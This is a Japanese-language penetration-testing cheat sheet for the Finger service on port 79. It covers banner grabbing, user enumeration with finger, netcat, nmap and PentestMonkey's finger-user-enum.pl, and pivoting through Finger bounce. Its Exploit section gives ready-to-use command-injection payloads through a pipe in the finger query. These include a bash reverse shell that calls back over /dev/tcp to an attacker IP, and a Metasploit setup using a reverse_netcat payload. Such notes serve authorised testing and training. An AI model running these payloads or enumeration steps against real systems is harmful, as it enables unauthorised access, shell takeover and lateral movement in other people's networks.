# Finger とは

- ユーザー情報を取得するためのプロトコル・サービス（RFC 1288）
- **ログイン名・フルネーム・オフィス所在地・電話番号・アイドル時間・最終メール受信時刻**、およびユーザーのプランファイル（`.plan`）・プロジェクトファイル（`.project`）の内容を返す
- 認証なしでリモートからユーザー情報を照会できるため、**ユーザー列挙の踏み台**として悪用されることがある
- 一部の実装ではコマンドインジェクションが可能

---

# Recon

## バナーグラブ・バージョン確認

```zsh
nc -vn <TargetIP> 79
sudo nmap -sV -p 79 --script=banner <TargetIP>
```
確認すべき情報：
- OSバージョン
- Fingerデーモンのバージョン（古い実装はRCEに脆弱な場合あり）

---

# Enumeration

fingerコマンドによるユーザー列挙
```zsh
# ユーザー一覧
finger @<TargetIP>

# 特定ユーザーの情報
finger <username>@<TargetIP>
```

>[!NOTE]
>Fingerは `~/.plan` や `~/.project` の内容を返すことがある。プロジェクトタイムラインや機密情報、場合によってはクレデンシャルが含まれていることがある。

fingerコマンド代替
```zsh
echo "<username>" | nc -vn <TargetIP> 79
```

finger-user-enum.pl（PentestMonkey）
```zsh
finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TargetIP>
finger-user-enum.pl -u root -t <TargetIP>
finger-user-enum.pl -U users.txt -T ips.txt
```

nmap スクリプト
```zsh
nmap -p 79 --script finger <TargetIP>
nmap -sV -p 79 --script=banner <TargetIP>
```

---

# Exploit

## コマンドインジェクション（RCE）

一部のFingerサービス実装では、入力のサニタイズが不十分なため、パイプを通じて任意のコマンドを実行できる。

```zsh
finger "|/bin/id@<TargetIP>"
finger "|/bin/ls -a /@<TargetIP>"
# 失敗時の出力： In real life: ???
```

リバースシェル
```sh
finger "|/bin/bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1@<TargetIP>"
```
### Metasploit でリバースシェル

```zsh
use auxiliary/scanner/finger/finger_users
set RHOSTS <TargetIP>
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <AttackerIP>
set LPORT 4444
exploit
```

## Finger Bounce（ピボット）

中間の侵害済みホストを経由して、ファイアウォール内部のマシンへFingerクエリをリレーする手法。
ただし、中間の侵害済みホストとターゲットホスト両方でFinger が使える必要がある。

```zsh
# 中間ホスト経由でクエリをリレー
finger user@<CompromisedHost>@<VictimIP>

# 別フォーマット
finger @<InternalHost>@<ExternalHost>
```

> [!TIP] Finger Bounceは、外部から直接アクセスできない内部マシンへのラテラルムーブメントに使える。侵害済みのホストをリレーとして、内部ネットワーク上のFingerサービスへクエリを送る。
